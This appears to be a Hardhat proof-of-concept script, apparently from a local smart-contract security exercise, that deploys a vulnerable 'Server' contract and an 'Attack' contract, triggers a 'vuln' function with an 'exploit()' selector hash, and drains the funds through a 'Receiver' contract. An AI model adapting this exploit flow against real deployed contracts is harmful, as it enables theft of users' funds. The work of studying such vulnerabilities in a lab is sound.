const { ethers } = require("hardhat");// TODO: 语法
// const web3 = require('web3');

async function getBalanceAt(addr) {
    const balance = await ethers.provider.getBalance(addr);
    return ethers.formatEther(balance);
}

async function main() {
    // 返回任意长度的合约账号地址 比如我这里只要返回两个就行
    const [victim, attacker] = await ethers.getSigners();

    const victimAccountAddr = await victim.getAddress();
    const attackerAccountAddr = await attacker.getAddress();

    console.log(`Victim account's address is ${victimAccountAddr}`);
    console.log(`Attacker account's address is ${attackerAccountAddr}`);

    const initAmount = ethers.parseEther("10");

    // 部署Server合约
    const server = await ethers.deployContract("Server", {
        signer: victim,
        value: initAmount,
    });
    await server.waitForDeployment();

    const serverConAddr = await server.getAddress();

    console.log(`Server contract deployed at ${serverConAddr}`)

    console.log(`Server contract's balance is ${await getBalanceAt(serverConAddr)} Wei`);

    // 部署Attacker合约
    const attack = await ethers.deployContract(
        "Attack", 
        [], 
        { signer: attacker, }
    );
    await attack.waitForDeployment();

    const attackConAddr = await attack.getAddress();

    console.log(`Attack contract deployed at ${attackConAddr}`)

    const hash = (str) => {return ethers.keccak256(ethers.toUtf8Bytes(str))};

    // 调用Server合约的漏洞函数
    await server.vuln(attackConAddr, hash("exploit()"))
    
    // 盗窃走所有资产 此时Receiver合约有log
    await server.withdraw();

    console.log(`Attack contract's balance is ${await getBalanceAt(attackerAccountAddr)} Wei before withdraw`);

    const receiver = await ethers.getContractAt(
        "Receiver", 
        "0xa16e02e87b7454126e5e10d957a927a7f5b5d2be"/* NOTE: 需要检查会不会变 */
    );
    await receiver.withdraw();

    console.log(`Attack contract's balance is ${await getBalanceAt(attackerAccountAddr)} Wei after withdraw`);

}


main().then(() => process.exit(0))
      .catch((e) => {
        console.error(e);
        process.exit(1)
    })